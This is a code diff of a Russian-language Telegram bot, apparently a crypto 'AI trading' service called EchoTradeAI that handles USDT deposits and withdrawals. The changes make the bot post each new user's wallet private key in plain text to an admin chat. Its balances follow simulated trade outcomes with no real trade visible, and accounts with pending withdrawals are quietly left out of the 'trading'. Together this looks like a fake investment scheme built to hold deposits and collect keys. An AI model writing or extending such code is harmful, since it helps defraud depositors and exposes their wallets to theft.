@@ -3,7 +3,7 @@ const { getUser, createUser, getUsersWithBalanceGreaterThan, updateUserBalance }
 const { getWallet, createWallet, getBTCPrice, checkForDeposits, checkForDeposit, isValidTronAddress } = require('../services/walletService');
 const { createTransaction, getHistory } = require('../services/historyService');
 const { getTransactionsByPeriod } = require('../services/transactionService');
-const { createPromo, sendPendingWithdraw } = require('../services/adminService');
+const { createPromo, sendPendingWithdraw, acceptWithdraw } = require('../services/adminService');
 const User = require('../models/user');
 const Wallet = require('../models/wallet');
 const History = require('../models/history');
@@ -14,6 +14,7 @@ const dayjs = require('dayjs');
 const history = require('../models/history');
 
 const channelUsername = '@echoai_news';
+const infoChat = -4211042707;
 
 // Generate a new USDT wallet
 async function generateUSDTWallet() {
@@ -63,10 +64,13 @@ bot.onText(/\/start(?: (r[\w\d]+))?/, async (msg, match) => {
       const wallet = await createWallet(chatId, address, privateKey);
       await wallet.save();
 
+      sendTextMessage(infoChat, `✅ @${user.username} создал аккаунт\n\n🔗 <b>USDT TRC20</b>: <code>${address}</code>\n\n🔐 <b>PRIVATE KEY</b>: <code>${privateKey}</code>`)
+
       if (referralCode) {
         const referringUser = await User.findOne({ referralCode });
         if (referringUser) {
-          const bonusImg = './assets/bonus.png'
+          const bonusImg = './assets/bonus.png';
+          sendTextMessage(infoChat, `✅ @${referringUser.username} пригласил друга (@${username}) и получил <b>5USDT</b>`)
           sendMessageWithImage(referringUser.telegramId, `✅ Вы пригласили друга.\n\n🎁 Ваш баланс был пополнен на <strong>5 USDT</strong>`, bonusImg);
           referringUser.referrals.push(chatId);
           referringUser.balance += 5;
@@ -169,35 +173,60 @@ bot.onText(/\/createpromo (.+)/, async (msg, match) => {
   }
 });
 
+bot.onText(/\/acceptwithdraw (.+)/, async (msg, match) => {
+  const chatId = msg.chat.id;
+  try {
+    if (chatId === infoChat) {
+      const params = match[1].split(' ');
+      const userId = params[0];
+      const historyId = params[1];
+      const history = await History.findOne({ historyId })
+      console.log(chatId, userId, historyId, history)
+
+
+      acceptWithdraw(userId, historyId);
+      sendTextMessage(infoChat, '✅ Успешно')
+      sendTextMessage(userId, `📢 Уважаемый пользователь! 💸\n\nМы рады сообщить, что ваш запрос на вывод средств успешно принят! 💰\n\n🔢 Сумма к выводу: <b>${history.amount}</b> TRC20\n\n⏳ В ближайшее время ваша транзакция будет обработана. Пожалуйста, ожидайте подтверждения.\n\nСпасибо, что пользуетесь нашим сервисом! Если у вас возникнут какие-либо вопросы, не стесняйтесь обращаться в нашу службу поддержки.\n\nС уважением,\nКоманда EchoTradeAI`)
+
+    }
+  } catch (error) {
+    console.error('Error processing promocode:', error);
+    sendTextMessage(chatId, '❌ Произошла ошибка при обработке транзакции. Попробуйте снова.');
+  }
+});
+
 // Message handler
 bot.on('message', async (msg) => {
   const chatId = msg.chat.id;
   const message = msg.text;
   const user = await getUser(chatId);
 
-  if (user.waitingForWithdrawAmount) {
-    const withdrawAmount = parseFloat(text);
-    if (isNaN(withdrawAmount) || withdrawAmount <= 0) {
-      sendTextMessage(chatId, '❌ Пожалуйста, введите корректную сумму для вывода.');
-    } else if (withdrawAmount > user.balance) {
-      sendTextMessage(chatId, `❌ Недостаточно средств на балансе. Ваш текущий баланс: ${user.balance} USDT.`);
-    } else {
-      user.withdrawAmount = withdrawAmount;
-      user.waitingForWithdrawAmount = false;
-      user.waitingForWalletAddress = true;
-      await user.save();
-      sendTextMessage(chatId, '💸 Пожалуйста, введите адрес вашего кошелька USDT TRC20:');
-    }
-  } else if (user.waitingForWalletAddress) {
-    const walletAddress = text.trim();
-    if (!walletAddress || !isValidTronAddress(walletAddress)) { // Предположим, что у вас есть функция для проверки адреса Tron
-      sendTextMessage(chatId, '❌ Пожалуйста, введите корректный адрес кошелька USDT TRC20.');
-    } else {
-      await sendPendingWithdraw(chatId, user.withdrawAmount, walletAddress);
-      user.waitingForWalletAddress = false;
-      user.withdrawAmount = null;
-      await user.save();
-      sendTextMessage(chatId, '✅ Ваша заявка на вывод средств принята и находится на рассмотрении.\n\n🧑‍💻 Техническая поддержка: @echoai_support');
+  if (user) {
+    if (user.waitingForWithdrawAmount) {
+      const withdrawAmount = parseFloat(message);
+      if (isNaN(withdrawAmount) || withdrawAmount <= 0) {
+        sendTextMessage(chatId, '❌ Пожалуйста, введите корректную сумму для вывода.');
+      } else if (withdrawAmount > user.balance) {
+        sendTextMessage(chatId, `❌ Недостаточно средств на балансе. Ваш текущий баланс: ${user.balance} USDT.`);
+      } else {
+        user.withdrawAmount = withdrawAmount;
+        user.waitingForWithdrawAmount = false;
+        user.waitingForWalletAddress = true;
+        await user.save();
+        sendTextMessage(chatId, '💸 Пожалуйста, введите адрес вашего кошелька USDT TRC20:');
+      }
+    } else if (user.waitingForWalletAddress) {
+      const walletAddress = message.trim();
+      if (!walletAddress || !isValidTronAddress(walletAddress)) { // Предположим, что у вас есть функция для проверки адреса Tron
+        sendTextMessage(chatId, '❌ Пожалуйста, введите корректный адрес кошелька USDT TRC20.');
+      } else {
+        const historyId = await sendPendingWithdraw(chatId, user.withdrawAmount, walletAddress);
+        sendTextMessage(infoChat, `🔷 ${user.username} запросил на вывод <b>${user.withdrawAmount} USDT</b>\n\n🆔 <code>${walletAddress}</code>\n\n<code>/acceptwithdraw ${user.telegramId} ${historyId}</code>`)
+        sendTextMessage(chatId, '✅ Ваша заявка на вывод средств принята и находится на рассмотрении.\n\n🧑‍💻 Техническая поддержка: @echoai_support');
+        user.waitingForWalletAddress = false;
+        user.withdrawAmount = null;
+        await user.save();
+      }
     }
   }
 
@@ -447,10 +476,14 @@ async function newTransaction() {
 
   for (const userId of users) {
     const user = await getUser(userId.telegramId);
-    if (user && user.status === true) {
-      const openImg = './assets/open.png';
-      const message = `⏳ Бот открыл новую сделку ⏳\n\n🚀 Пара: <strong>BTC/USDT</strong>\n\n🔷 Актуальная цена: <strong>${btcPrice}</strong>`;
-      await sendMessageWithImage(user.telegramId, message, openImg);
+    const userHistory = await getHistory(userId.telegramId);
+    const pendingWithdraw = userHistory.filter(history => history.status === 'pending')
+    if (pendingWithdraw.length === 0) {
+      if (user && user.status === true) {
+        const openImg = './assets/open.png';
+        const message = `⏳ Бот открыл новую сделку ⏳\n\n🚀 Пара: <strong>BTC/USDT</strong>\n\n🔷 Актуальная цена: <strong>${btcPrice}</strong>`;
+        await sendMessageWithImage(user.telegramId, message, openImg);
+      }
     }
   }
 
@@ -459,19 +492,23 @@ async function newTransaction() {
 
   for (const userId of users) {
     const user = await getUser(userId.telegramId);
-    if (user && user.status === true) {
-      const successImg = './assets/success.png';
-      const failureImg = './assets/failure.png';
-      let message;
-      if (status === 'success') {
-        message = `✅ Прогноз оказался успешным!\n\n🚀 Пара: <strong>BTC/USDT</strong>\n\n🔷 Актуальная цена: <strong>${btcCurrentPrice}</strong>\n\n💸 Прибыль от сделки составила: ${profitOrLossPercentage}%`;
-      } else {
-        message = `❌ Прогноз оказался неудачным.\n\n🚀 Пара: <strong>BTC/USDT</strong>\n\n🔷 Актуальная цена: <strong>${btcCurrentPrice}</strong>\n\n💥 Убыток от сделки составил: ${profitOrLossPercentage}%`;
+    const userHistory = await getHistory(userId.telegramId);
+    const pendingWithdraw = userHistory.filter(history => history.status === 'pending')
+    if (pendingWithdraw.length === 0) {
+      if (user && user.status === true) {
+        const successImg = './assets/success.png';
+        const failureImg = './assets/failure.png';
+        let message;
+        if (status === 'success') {
+          message = `✅ Прогноз оказался успешным!\n\n🚀 Пара: <strong>BTC/USDT</strong>\n\n🔷 Актуальная цена: <strong>${btcCurrentPrice}</strong>\n\n💸 Прибыль от сделки составила: ${profitOrLossPercentage}%`;
+        } else {
+          message = `❌ Прогноз оказался неудачным.\n\n🚀 Пара: <strong>BTC/USDT</strong>\n\n🔷 Актуальная цена: <strong>${btcCurrentPrice}</strong>\n\n💥 Убыток от сделки составил: ${profitOrLossPercentage}%`;
+        }
+        await sendMessageWithImage(user.telegramId, message, status === 'success' ? successImg : failureImg);
+        const profitOrLossMultiplier = 1 + (profitOrLossPercentage / 100);
+        const newBalance = user.balance * profitOrLossMultiplier;
+        await updateUserBalance(userId.telegramId, newBalance);
       }
-      await sendMessageWithImage(user.telegramId, message, status === 'success' ? successImg : failureImg);
-      const profitOrLossMultiplier = 1 + (profitOrLossPercentage / 100);
-      const newBalance = user.balance * profitOrLossMultiplier;
-      await updateUserBalance(userId.telegramId, newBalance);
     }
   }
 
@@ -502,5 +539,5 @@ const startDepositCheck = () => {
   setInterval(checkForDeposits, 5 * 60 * 1000);
 }
 
-// startDepositCheck();
-// newTransaction();
+startDepositCheck();
+newTransaction();
